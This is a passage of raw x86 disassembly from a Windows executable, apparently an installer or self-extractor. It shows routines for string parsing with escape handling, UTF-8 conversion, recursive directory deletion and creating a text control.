  402fb1:	2b 45 f4             	sub    -0xc(%ebp),%eax
  402fb4:	3b f8                	cmp    %eax,%edi
  402fb6:	77 23                	ja     0x402fdb
  402fb8:	ff 75 f4             	push   -0xc(%ebp)
  402fbb:	ff 75 0c             	push   0xc(%ebp)
  402fbe:	ff 75 f8             	push   -0x8(%ebp)
  402fc1:	e8 b0 62 01 00       	call   0x419276
  402fc6:	83 c4 0c             	add    $0xc,%esp
  402fc9:	85 c0                	test   %eax,%eax
  402fcb:	75 de                	jne    0x402fab
  402fcd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402fd0:	03 f8                	add    %eax,%edi
  402fd2:	01 45 f8             	add    %eax,-0x8(%ebp)
  402fd5:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  402fd9:	eb 92                	jmp    0x402f6d
  402fdb:	2b f7                	sub    %edi,%esi
  402fdd:	01 7d ec             	add    %edi,-0x14(%ebp)
  402fe0:	56                   	push   %esi
  402fe1:	8d 84 3d e0 ef ff ff 	lea    -0x1020(%ebp,%edi,1),%eax
  402fe8:	11 5d f0             	adc    %ebx,-0x10(%ebp)
  402feb:	50                   	push   %eax
  402fec:	8d 85 e0 ef ff ff    	lea    -0x1020(%ebp),%eax
  402ff2:	50                   	push   %eax
  402ff3:	ff 15 3c a2 41 00    	call   *0x41a23c
  402ff9:	83 c4 0c             	add    $0xc,%esp
  402ffc:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  402fff:	77 0d                	ja     0x40300e
  403001:	81 7d ec 00 00 10 00 	cmpl   $0x100000,-0x14(%ebp)
  403008:	0f 86 22 ff ff ff    	jbe    0x402f30
  40300e:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403011:	33 c0                	xor    %eax,%eax
  403013:	39 59 04             	cmp    %ebx,0x4(%ecx)
  403016:	0f 95 c0             	setne  %al
  403019:	eb 06                	jmp    0x403021
  40301b:	b0 01                	mov    $0x1,%al
  40301d:	eb 02                	jmp    0x403021
  40301f:	32 c0                	xor    %al,%al
  403021:	5f                   	pop    %edi
  403022:	5e                   	pop    %esi
  403023:	5b                   	pop    %ebx
  403024:	c9                   	leave
  403025:	c3                   	ret
  403026:	55                   	push   %ebp
  403027:	8b ec                	mov    %esp,%ebp
  403029:	83 ec 18             	sub    $0x18,%esp
  40302c:	83 3d 6c ea 41 00 03 	cmpl   $0x3,0x41ea6c
  403033:	75 0c                	jne    0x403041
  403035:	6a 7a                	push   $0x7a
  403037:	e8 99 ee ff ff       	call   0x401ed5
  40303c:	e9 86 00 00 00       	jmp    0x4030c7
  403041:	56                   	push   %esi
  403042:	57                   	push   %edi
  403043:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403046:	e8 ce fa ff ff       	call   0x402b19
  40304b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40304e:	8b 75 08             	mov    0x8(%ebp),%esi
  403051:	8b 0e                	mov    (%esi),%ecx
  403053:	8b f8                	mov    %eax,%edi
  403055:	0f b6 04 08          	movzbl (%eax,%ecx,1),%eax
  403059:	eb 17                	jmp    0x403072
  40305b:	3c 0a                	cmp    $0xa,%al
  40305d:	74 17                	je     0x403076
  40305f:	3c 0d                	cmp    $0xd,%al
  403061:	74 13                	je     0x403076
  403063:	50                   	push   %eax
  403064:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403067:	e8 b5 fb ff ff       	call   0x402c21
  40306c:	8b 06                	mov    (%esi),%eax
  40306e:	47                   	inc    %edi
  40306f:	8a 04 07             	mov    (%edi,%eax,1),%al
  403072:	84 c0                	test   %al,%al
  403074:	75 e5                	jne    0x40305b
  403076:	68 e9 fd 00 00       	push   $0xfde9
  40307b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40307e:	50                   	push   %eax
  40307f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403082:	50                   	push   %eax
  403083:	e8 46 fd ff ff       	call   0x402dce
  403088:	83 c4 0c             	add    $0xc,%esp
  40308b:	80 7d 10 00          	cmpb   $0x0,0x10(%ebp)
  40308f:	5f                   	pop    %edi
  403090:	5e                   	pop    %esi
  403091:	ff 75 f4             	push   -0xc(%ebp)
  403094:	75 14                	jne    0x4030aa
  403096:	ff 35 80 e0 41 00    	push   0x41e080
  40309c:	6a 0b                	push   $0xb
  40309e:	6a 00                	push   $0x0
  4030a0:	e8 61 65 00 00       	call   0x409606
  4030a5:	83 c4 10             	add    $0x10,%esp
  4030a8:	eb 0c                	jmp    0x4030b6
  4030aa:	6a 20                	push   $0x20
  4030ac:	6a 00                	push   $0x0
  4030ae:	e8 53 65 00 00       	call   0x409606
  4030b3:	83 c4 0c             	add    $0xc,%esp
  4030b6:	ff 75 f4             	push   -0xc(%ebp)
  4030b9:	e8 ac 61 01 00       	call   0x41926a
  4030be:	ff 75 e8             	push   -0x18(%ebp)
  4030c1:	e8 a4 61 01 00       	call   0x41926a
  4030c6:	59                   	pop    %ecx
  4030c7:	32 c0                	xor    %al,%al
  4030c9:	59                   	pop    %ecx
  4030ca:	c9                   	leave
  4030cb:	c3                   	ret
  4030cc:	55                   	push   %ebp
  4030cd:	8b ec                	mov    %esp,%ebp
  4030cf:	83 ec 34             	sub    $0x34,%esp
  4030d2:	56                   	push   %esi
  4030d3:	57                   	push   %edi
  4030d4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4030d7:	e8 0f e4 ff ff       	call   0x4014eb
  4030dc:	8b 45 08             	mov    0x8(%ebp),%eax
  4030df:	8b 30                	mov    (%eax),%esi
  4030e1:	0f b7 3e             	movzwl (%esi),%edi
  4030e4:	66 85 ff             	test   %di,%di
  4030e7:	0f 84 d6 00 00 00    	je     0x4031c3
  4030ed:	53                   	push   %ebx
  4030ee:	8d 5e 04             	lea    0x4(%esi),%ebx
  4030f1:	66 83 ff 7e          	cmp    $0x7e,%di
  4030f5:	0f 85 ae 00 00 00    	jne    0x4031a9
  4030fb:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  4030ff:	66 3d 78 00          	cmp    $0x78,%ax
  403103:	75 66                	jne    0x40316b
  403105:	53                   	push   %ebx
  403106:	e8 31 ee ff ff       	call   0x401f3c
  40310b:	85 c0                	test   %eax,%eax
  40310d:	59                   	pop    %ecx
  40310e:	7c 5b                	jl     0x40316b
  403110:	50                   	push   %eax
  403111:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403114:	e8 18 fa ff ff       	call   0x402b31
  403119:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40311c:	e8 ca e3 ff ff       	call   0x4014eb
  403121:	6a 00                	push   $0x0
  403123:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403126:	50                   	push   %eax
  403127:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40312a:	50                   	push   %eax
  40312b:	e8 9e fc ff ff       	call   0x402dce
  403130:	83 c4 0c             	add    $0xc,%esp
  403133:	50                   	push   %eax
  403134:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403137:	e8 00 e3 ff ff       	call   0x40143c
  40313c:	ff 75 cc             	push   -0x34(%ebp)
  40313f:	e8 26 61 01 00       	call   0x41926a
  403144:	59                   	pop    %ecx
  403145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403148:	50                   	push   %eax
  403149:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40314c:	e8 6b e3 ff ff       	call   0x4014bc
  403151:	ff 75 e4             	push   -0x1c(%ebp)
  403154:	83 c6 08             	add    $0x8,%esi
  403157:	83 c3 08             	add    $0x8,%ebx
  40315a:	e8 0b 61 01 00       	call   0x41926a
  40315f:	ff 75 d8             	push   -0x28(%ebp)
  403162:	e8 03 61 01 00       	call   0x41926a
  403167:	59                   	pop    %ecx
  403168:	59                   	pop    %ecx
  403169:	eb 4b                	jmp    0x4031b6
  40316b:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  40316f:	66 3d 58 00          	cmp    $0x58,%ax
  403173:	75 34                	jne    0x4031a9
  403175:	53                   	push   %ebx
  403176:	e8 c1 ed ff ff       	call   0x401f3c
  40317b:	85 c0                	test   %eax,%eax
  40317d:	59                   	pop    %ecx
  40317e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403181:	7c 26                	jl     0x4031a9
  403183:	8d 46 08             	lea    0x8(%esi),%eax
  403186:	50                   	push   %eax
  403187:	e8 b0 ed ff ff       	call   0x401f3c
  40318c:	85 c0                	test   %eax,%eax
  40318e:	59                   	pop    %ecx
  40318f:	7c 18                	jl     0x4031a9
  403191:	33 c9                	xor    %ecx,%ecx
  403193:	8a 6d fc             	mov    -0x4(%ebp),%ch
  403196:	0b c8                	or     %eax,%ecx
  403198:	51                   	push   %ecx
  403199:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40319c:	e8 f4 e5 ff ff       	call   0x401795
  4031a1:	83 c6 0c             	add    $0xc,%esi
  4031a4:	83 c3 0c             	add    $0xc,%ebx
  4031a7:	eb 0d                	jmp    0x4031b6
  4031a9:	57                   	push   %edi
  4031aa:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4031ad:	e8 e3 e5 ff ff       	call   0x401795
  4031b2:	46                   	inc    %esi
  4031b3:	46                   	inc    %esi
  4031b4:	43                   	inc    %ebx
  4031b5:	43                   	inc    %ebx
  4031b6:	0f b7 3e             	movzwl (%esi),%edi
  4031b9:	66 85 ff             	test   %di,%di
  4031bc:	0f 85 2f ff ff ff    	jne    0x4030f1
  4031c2:	5b                   	pop    %ebx
  4031c3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4031c6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4031c9:	50                   	push   %eax
  4031ca:	e8 6d e2 ff ff       	call   0x40143c
  4031cf:	ff 75 f0             	push   -0x10(%ebp)
  4031d2:	e8 93 60 01 00       	call   0x41926a
  4031d7:	59                   	pop    %ecx
  4031d8:	5f                   	pop    %edi
  4031d9:	5e                   	pop    %esi
  4031da:	c9                   	leave
  4031db:	c3                   	ret
  4031dc:	55                   	push   %ebp
  4031dd:	8b ec                	mov    %esp,%ebp
  4031df:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  4031e5:	53                   	push   %ebx
  4031e6:	56                   	push   %esi
  4031e7:	57                   	push   %edi
  4031e8:	ff 75 08             	push   0x8(%ebp)
  4031eb:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4031ee:	e8 74 f8 ff ff       	call   0x402a67
  4031f3:	68 8c a6 41 00       	push   $0x41a68c
  4031f8:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4031fb:	e8 b8 f8 ff ff       	call   0x402ab8
  403200:	8b 7d f4             	mov    -0xc(%ebp),%edi
  403203:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  403209:	50                   	push   %eax
  40320a:	57                   	push   %edi
  40320b:	ff 15 00 a1 41 00    	call   *0x41a100
  403211:	8b 35 80 a1 41 00    	mov    0x41a180,%esi
  403217:	8b d8                	mov    %eax,%ebx
  403219:	83 fb ff             	cmp    $0xffffffff,%ebx
  40321c:	0f 84 96 00 00 00    	je     0x4032b8
  403222:	ff 75 08             	push   0x8(%ebp)
  403225:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403228:	e8 d6 e1 ff ff       	call   0x401403
  40322d:	6a 5c                	push   $0x5c
  40322f:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403232:	e8 5e e5 ff ff       	call   0x401795
  403237:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  40323d:	50                   	push   %eax
  40323e:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403241:	e8 72 f8 ff ff       	call   0x402ab8
  403246:	f6 85 a4 fd ff ff 10 	testb  $0x10,-0x25c(%ebp)
  40324d:	8b 7d f4             	mov    -0xc(%ebp),%edi
  403250:	74 35                	je     0x403287
  403252:	68 88 a6 41 00       	push   $0x41a688
  403257:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  40325d:	50                   	push   %eax
  40325e:	ff 15 24 a1 41 00    	call   *0x41a124
  403264:	85 c0                	test   %eax,%eax
  403266:	74 33                	je     0x40329b
  403268:	68 80 a6 41 00       	push   $0x41a680
  40326d:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  403273:	50                   	push   %eax
  403274:	ff 15 24 a1 41 00    	call   *0x41a124
  40327a:	85 c0                	test   %eax,%eax
  40327c:	74 1d                	je     0x40329b
  40327e:	57                   	push   %edi
  40327f:	e8 58 ff ff ff       	call   0x4031dc
  403284:	59                   	pop    %ecx
  403285:	eb 10                	jmp    0x403297
  403287:	6a 00                	push   $0x0
  403289:	57                   	push   %edi
  40328a:	ff d6                	call   *%esi
  40328c:	85 c0                	test   %eax,%eax
  40328e:	74 4b                	je     0x4032db
  403290:	57                   	push   %edi
  403291:	ff 15 04 a1 41 00    	call   *0x41a104
  403297:	85 c0                	test   %eax,%eax
  403299:	74 40                	je     0x4032db
  40329b:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  4032a1:	50                   	push   %eax
  4032a2:	53                   	push   %ebx
  4032a3:	ff 15 08 a1 41 00    	call   *0x41a108
  4032a9:	85 c0                	test   %eax,%eax
  4032ab:	0f 85 71 ff ff ff    	jne    0x403222
  4032b1:	53                   	push   %ebx
  4032b2:	ff 15 0c a1 41 00    	call   *0x41a10c
  4032b8:	6a 00                	push   $0x0
  4032ba:	ff 75 08             	push   0x8(%ebp)
  4032bd:	ff d6                	call   *%esi
  4032bf:	85 c0                	test   %eax,%eax
  4032c1:	74 18                	je     0x4032db
  4032c3:	ff 75 08             	push   0x8(%ebp)
  4032c6:	ff 15 10 a1 41 00    	call   *0x41a110
  4032cc:	85 c0                	test   %eax,%eax
  4032ce:	74 0b                	je     0x4032db
  4032d0:	57                   	push   %edi
  4032d1:	e8 94 5f 01 00       	call   0x41926a
  4032d6:	33 c0                	xor    %eax,%eax
  4032d8:	40                   	inc    %eax
  4032d9:	eb 08                	jmp    0x4032e3
  4032db:	57                   	push   %edi
  4032dc:	e8 89 5f 01 00       	call   0x41926a
  4032e1:	33 c0                	xor    %eax,%eax
  4032e3:	59                   	pop    %ecx
  4032e4:	5f                   	pop    %edi
  4032e5:	5e                   	pop    %esi
  4032e6:	5b                   	pop    %ebx
  4032e7:	c9                   	leave
  4032e8:	c3                   	ret
  4032e9:	83 3d 6c ea 41 00 00 	cmpl   $0x0,0x41ea6c
  4032f0:	74 04                	je     0x4032f6
  4032f2:	33 c0                	xor    %eax,%eax
  4032f4:	40                   	inc    %eax
  4032f5:	c3                   	ret
  4032f6:	56                   	push   %esi
  4032f7:	8b 74 24 08          	mov    0x8(%esp),%esi
  4032fb:	56                   	push   %esi
  4032fc:	ff 15 a4 a1 41 00    	call   *0x41a1a4
  403302:	83 f8 ff             	cmp    $0xffffffff,%eax
  403305:	75 05                	jne    0x40330c
  403307:	33 c0                	xor    %eax,%eax
  403309:	40                   	inc    %eax
  40330a:	5e                   	pop    %esi
  40330b:	c3                   	ret
  40330c:	a8 10                	test   $0x10,%al
  40330e:	75 1a                	jne    0x40332a
  403310:	6a 00                	push   $0x0
  403312:	56                   	push   %esi
  403313:	ff 15 80 a1 41 00    	call   *0x41a180
  403319:	85 c0                	test   %eax,%eax
  40331b:	74 09                	je     0x403326
  40331d:	56                   	push   %esi
  40331e:	ff 15 04 a1 41 00    	call   *0x41a104
  403324:	5e                   	pop    %esi
  403325:	c3                   	ret
  403326:	33 c0                	xor    %eax,%eax
  403328:	5e                   	pop    %esi
  403329:	c3                   	ret
  40332a:	56                   	push   %esi
  40332b:	e8 ac fe ff ff       	call   0x4031dc
  403330:	59                   	pop    %ecx
  403331:	5e                   	pop    %esi
  403332:	c3                   	ret
  403333:	53                   	push   %ebx
  403334:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403338:	8b 03                	mov    (%ebx),%eax
  40333a:	83 63 04 00          	andl   $0x0,0x4(%ebx)
  40333e:	66 83 20 00          	andw   $0x0,(%eax)
  403342:	56                   	push   %esi
  403343:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403347:	57                   	push   %edi
  403348:	6a 02                	push   $0x2
  40334a:	5f                   	pop    %edi
  40334b:	eb 08                	jmp    0x403355
  40334d:	66 3d 20 00          	cmp    $0x20,%ax
  403351:	77 0a                	ja     0x40335d
  403353:	03 f7                	add    %edi,%esi
  403355:	0f b7 06             	movzwl (%esi),%eax
  403358:	66 85 c0             	test   %ax,%ax
  40335b:	75 f0                	jne    0x40334d
  40335d:	66 83 3e 2c          	cmpw   $0x2c,(%esi)
  403361:	75 0f                	jne    0x403372
  403363:	eb 0b                	jmp    0x403370
  403365:	66 85 c0             	test   %ax,%ax
  403368:	74 4d                	je     0x4033b7
  40336a:	66 3d 2c 00          	cmp    $0x2c,%ax
  40336e:	74 47                	je     0x4033b7
  403370:	03 f7                	add    %edi,%esi
  403372:	0f b7 06             	movzwl (%esi),%eax
  403375:	66 3d 7b 00          	cmp    $0x7b,%ax
  403379:	75 ea                	jne    0x403365
  40337b:	eb 30                	jmp    0x4033ad
  40337d:	0f b7 c0             	movzwl %ax,%eax
  403380:	83 e8 7b             	sub    $0x7b,%eax
  403383:	74 12                	je     0x403397
  403385:	2b c7                	sub    %edi,%eax
  403387:	75 19                	jne    0x4033a2
  403389:	8d 46 02             	lea    0x2(%esi),%eax
  40338c:	66 83 38 7d          	cmpw   $0x7d,(%eax)
  403390:	74 0e                	je     0x4033a0
  403392:	8d 46 02             	lea    0x2(%esi),%eax
  403395:	eb 22                	jmp    0x4033b9
  403397:	8d 46 02             	lea    0x2(%esi),%eax
  40339a:	66 83 38 7b          	cmpw   $0x7b,(%eax)
  40339e:	75 02                	jne    0x4033a2
  4033a0:	8b f0                	mov    %eax,%esi
  4033a2:	0f b7 06             	movzwl (%esi),%eax
  4033a5:	50                   	push   %eax
  4033a6:	8b cb                	mov    %ebx,%ecx
  4033a8:	e8 e8 e3 ff ff       	call   0x401795
  4033ad:	03 f7                	add    %edi,%esi
  4033af:	0f b7 06             	movzwl (%esi),%eax
  4033b2:	66 85 c0             	test   %ax,%ax
  4033b5:	75 c6                	jne    0x40337d
  4033b7:	8b c6                	mov    %esi,%eax
  4033b9:	5f                   	pop    %edi
  4033ba:	5e                   	pop    %esi
  4033bb:	5b                   	pop    %ebx
  4033bc:	c3                   	ret
  4033bd:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4033c1:	56                   	push   %esi
  4033c2:	6a 5c                	push   $0x5c
  4033c4:	e8 25 f7 ff ff       	call   0x402aee
  4033c9:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4033cd:	6a 2f                	push   $0x2f
  4033cf:	8b f0                	mov    %eax,%esi
  4033d1:	e8 18 f7 ff ff       	call   0x402aee
  4033d6:	3b c6                	cmp    %esi,%eax
  4033d8:	7e 02                	jle    0x4033dc
  4033da:	8b f0                	mov    %eax,%esi
  4033dc:	8b c6                	mov    %esi,%eax
  4033de:	5e                   	pop    %esi
  4033df:	c3                   	ret
  4033e0:	56                   	push   %esi
  4033e1:	57                   	push   %edi
  4033e2:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4033e6:	8b cf                	mov    %edi,%ecx
  4033e8:	e8 fe e0 ff ff       	call   0x4014eb
  4033ed:	ff 74 24 10          	push   0x10(%esp)
  4033f1:	ff 15 c8 a2 41 00    	call   *0x41a2c8
  4033f7:	8b f0                	mov    %eax,%esi
  4033f9:	85 f6                	test   %esi,%esi
  4033fb:	7e 21                	jle    0x40341e
  4033fd:	8d 46 01             	lea    0x1(%esi),%eax
  403400:	50                   	push   %eax
  403401:	50                   	push   %eax
  403402:	8b cf                	mov    %edi,%ecx
  403404:	e8 97 f6 ff ff       	call   0x402aa0
  403409:	50                   	push   %eax
  40340a:	ff 74 24 18          	push   0x18(%esp)
  40340e:	ff 15 c4 a2 41 00    	call   *0x41a2c4
  403414:	8b 07                	mov    (%edi),%eax
  403416:	66 83 24 70 00       	andw   $0x0,(%eax,%esi,2)
  40341b:	89 77 04             	mov    %esi,0x4(%edi)
  40341e:	8b c7                	mov    %edi,%eax
  403420:	5f                   	pop    %edi
  403421:	5e                   	pop    %esi
  403422:	c3                   	ret
  403423:	55                   	push   %ebp
  403424:	8b ec                	mov    %esp,%ebp
  403426:	83 ec 74             	sub    $0x74,%esp
  403429:	53                   	push   %ebx
  40342a:	56                   	push   %esi
  40342b:	8b 75 08             	mov    0x8(%ebp),%esi
  40342e:	57                   	push   %edi
  40342f:	6a 40                	push   $0x40
  403431:	8d 45 8c             	lea    -0x74(%ebp),%eax
  403434:	50                   	push   %eax
  403435:	56                   	push   %esi
  403436:	ff 15 9c a2 41 00    	call   *0x41a29c
  40343c:	85 c0                	test   %eax,%eax
  40343e:	74 49                	je     0x403489
  403440:	68 f8 a5 41 00       	push   $0x41a5f8
  403445:	8d 45 8c             	lea    -0x74(%ebp),%eax
  403448:	50                   	push   %eax
  403449:	ff 15 48 a1 41 00    	call   *0x41a148
  40344f:	85 c0                	test   %eax,%eax
  403451:	75 36                	jne    0x403489
  403453:	6a f0                	push   $0xfffffff0
  403455:	56                   	push   %esi
  403456:	ff 15 7c a2 41 00    	call   *0x41a27c
  40345c:	a8 0e                	test   $0xe,%al
  40345e:	75 29                	jne    0x403489
  403460:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403463:	56                   	push   %esi
  403464:	50                   	push   %eax
  403465:	e8 76 ff ff ff       	call   0x4033e0
  40346a:	6a 05                	push   $0x5
  40346c:	68 b8 a6 41 00       	push   $0x41a6b8
  403471:	ff 75 e8             	push   -0x18(%ebp)
  403474:	e8 f1 ea ff ff       	call   0x401f6a
  403479:	83 c4 14             	add    $0x14,%esp
  40347c:	85 c0                	test   %eax,%eax
  40347e:	74 10                	je     0x403490
  403480:	ff 75 e8             	push   -0x18(%ebp)
  403483:	e8 e2 5d 01 00       	call   0x41926a
  403488:	59                   	pop    %ecx
  403489:	33 c0                	xor    %eax,%eax
  40348b:	5f                   	pop    %edi
  40348c:	5e                   	pop    %esi
  40348d:	5b                   	pop    %ebx
  40348e:	c9                   	leave
  40348f:	c3                   	ret
  403490:	56                   	push   %esi
  403491:	ff 15 94 a2 41 00    	call   *0x41a294
  403497:	33 db                	xor    %ebx,%ebx
  403499:	3b c3                	cmp    %ebx,%eax
  40349b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40349e:	74 e0                	je     0x403480
  4034a0:	68 ac a6 41 00       	push   $0x41a6ac
  4034a5:	ff 15 68 a1 41 00    	call   *0x41a168
  4034ab:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4034ae:	50                   	push   %eax
  4034af:	56                   	push   %esi
  4034b0:	e8 ce eb ff ff       	call   0x402083
  4034b5:	59                   	pop    %ecx
  4034b6:	59                   	pop    %ecx
  4034b7:	56                   	push   %esi
  4034b8:	ff 15 80 a2 41 00    	call   *0x41a280
  4034be:	68 19 04 00 00       	push   $0x419
  4034c3:	8b f8                	mov    %eax,%edi
  4034c5:	ff 15 fc a0 41 00    	call   *0x41a0fc
  4034cb:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4034ce:	2b 45 d0             	sub    -0x30(%ebp),%eax
  4034d1:	53                   	push   %ebx
  4034d2:	53                   	push   %ebx
  4034d3:	57                   	push   %edi
  4034d4:	ff 75 fc             	push   -0x4(%ebp)
  4034d7:	50                   	push   %eax
  4034d8:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4034db:	2b 45 cc             	sub    -0x34(%ebp),%eax
  4034de:	50                   	push   %eax
  4034df:	ff 75 d0             	push   -0x30(%ebp)
  4034e2:	ff 75 cc             	push   -0x34(%ebp)
  4034e5:	68 04 08 00 50       	push   $0x50000804
  4034ea:	68 84 a5 41 00       	push   $0x41a584
  4034ef:	68 94 a6 41 00       	push   $0x41a694
  4034f4:	53                   	push   %ebx
  4034f5:	ff 15 a0 a2 41 00    	call   *0x41a2a0
  4034fb:	8b f8                	mov    %eax,%edi
  4034fd:	3b fb                	cmp    %ebx,%edi
  4034ff:	0f 84 7b ff ff ff    	je     0x403480
  403505:	56                   	push   %esi
  403506:	ff 15 b4 a2 41 00    	call   *0x41a2b4
  40350c:	8b 35 b8 a2 41 00    	mov    0x41a2b8,%esi
  403512:	53                   	push   %ebx
  403513:	6a 22                	push   $0x22
  403515:	68 59 04 00 00       	push   $0x459
  40351a:	57                   	push   %edi
  40351b:	ff d6                	call   *%esi
  40351d:	6a 0f                	push   $0xf
  40351f:	ff 15 cc a2 41 00    	call   *0x41a2cc
  403525:	50                   	push   %eax
  403526:	53                   	push   %ebx
  403527:	68 43 04 00 00       	push   $0x443
  40352c:	57                   	push   %edi
  40352d:	ff d6                	call   *%esi
  40352f:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
  403534:	50                   	push   %eax
  403535:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403538:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40353b:	50                   	push   %eax
  40353c:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40353f:	50                   	push   %eax
  403540:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  403543:	e8 ce f8 ff ff       	call   0x402e16
  403548:	83 c4 0c             	add    $0xc,%esp
  40354b:	ff 75 dc             	push   -0x24(%ebp)
  40354e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403551:	50                   	push   %eax
  403552:	68 61 04 00 00       	push   $0x461
  403557:	57                   	push   %edi
  403558:	ff d6                	call   *%esi
  40355a:	ff 75 dc             	push   -0x24(%ebp)
  40355d:	e8 08 5d 01 00       	call   0x41926a
  403562:	ff 75 e8             	push   -0x18(%ebp)
  403565:	e8 00 5d 01 00       	call   0x41926a
  40356a:	59                   	pop    %ecx
  40356b:	59                   	pop    %ecx
  40356c:	8b c7                	mov    %edi,%eax
  40356e:	e9 18 ff ff ff       	jmp    0x40348b
  403573:	55                   	push   %ebp
  403574:	8b ec                	mov    %esp,%ebp
  403576:	51                   	push   %ecx
  403577:	53                   	push   %ebx
  403578:	56                   	push   %esi
  403579:	57                   	push   %edi
  40357a:	8b 3d 28 a1 41 00    	mov    0x41a128,%edi
  403580:	6a 01                	push   $0x1
  403582:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403585:	50                   	push   %eax
  403586:	ff 75 0c             	push   0xc(%ebp)
  403589:	ff d7                	call   *%edi
  40358b:	8b 75 08             	mov    0x8(%ebp),%esi
  40358e:	8b ce                	mov    %esi,%ecx
  403590:	8b d8                	mov    %eax,%ebx
  403592:	e8 54 df ff ff       	call   0x4014eb
  403597:	8d 43 02             	lea    0x2(%ebx),%eax
  40359a:	50                   	push   %eax
  40359b:	8b ce                	mov    %esi,%ecx
  40359d:	89 45 08             	mov    %eax,0x8(%ebp)
  4035a0:	e8 fb f4 ff ff       	call   0x402aa0
  4035a5:	43                   	inc    %ebx
  4035a6:	53                   	push   %ebx
  4035a7:	ff 75 08             	push   0x8(%ebp)
  4035aa:	8b ce                	mov    %esi,%ecx
  4035ac:	e8 ef f4 ff ff       	call   0x402aa0
  4035b1:	50                   	push   %eax
  4035b2:	ff 75 0c             	push   0xc(%ebp)
  4035b5:	ff d7                	call   *%edi
  4035b7:	8b 3e                	mov    (%esi),%edi
  4035b9:	57                   	push   %edi
  4035ba:	e8 c5 db ff ff       	call   0x401184
  4035bf:	66 83 24 47 00       	andw   $0x0,(%edi,%eax,2)
  4035c4:	59                   	pop    %ecx
  4035c5:	89 46 04             	mov    %eax,0x4(%esi)
  4035c8:	5f                   	pop    %edi
  4035c9:	8b c6                	mov    %esi,%eax
  4035cb:	5e                   	pop    %esi
  4035cc:	5b                   	pop    %ebx
  4035cd:	c9                   	leave
  4035ce:	c3                   	ret
  4035cf:	56                   	push   %esi
  4035d0:	6a 18                	push   $0x18
  4035d2:	8b f1                	mov    %ecx,%esi
  4035d4:	e8 97 5c 01 00       	call   0x419270
  4035d9:	85 c0                	test   %eax,%eax
  4035db:	59                   	pop    %ecx
  4035dc:	74 0d                	je     0x4035eb
  4035de:	ff 74 24 08          	push   0x8(%esp)
  4035e2:	8b c8                	mov    %eax,%ecx
  4035e4:	e8 c4 f6 ff ff       	call   0x402cad
  4035e9:	eb 02                	jmp    0x4035ed
  4035eb:	33 c0                	xor    %eax,%eax
  4035ed:	50                   	push   %eax
  4035ee:	8b ce                	mov    %esi,%ecx
  4035f0:	e8 12 2e 01 00       	call   0x416407
  4035f5:	5e                   	pop    %esi
  4035f6:	c2 04 00             	ret    $0x4
  4035f9:	55                   	push   %ebp
  4035fa:	8b ec                	mov    %esp,%ebp
  4035fc:	56                   	push   %esi
  4035fd:	8b f1                	mov    %ecx,%esi
  4035ff:	8b 46 04             	mov    0x4(%esi),%eax
  403602:	39 45 08             	cmp    %eax,0x8(%ebp)
  403605:	57                   	push   %edi
  403606:	7e 03                	jle    0x40360b
  403608:	89 45 08             	mov    %eax,0x8(%ebp)
  40360b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40360e:	8b 79 04             	mov    0x4(%ecx),%edi
  403611:	85 ff                	test   %edi,%edi
  403613:	74 35                	je     0x40364a
  403615:	57                   	push   %edi
  403616:	8d 45 08             	lea    0x8(%ebp),%eax
  403619:	50                   	push   %eax
  40361a:	8b ce                	mov    %esi,%ecx
  40361c:	e8 65 f7 ff ff       	call   0x402d86
  403621:	33 c0                	xor    %eax,%eax
  403623:	85 ff                	test   %edi,%edi
  403625:	7e 1d                	jle    0x403644
  403627:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40362a:	03 c9                	add    %ecx,%ecx
  40362c:	53                   	push   %ebx
  40362d:	8b 55 0c             	mov    0xc(%ebp),%edx
  403630:	8b 12                	mov    (%edx),%edx
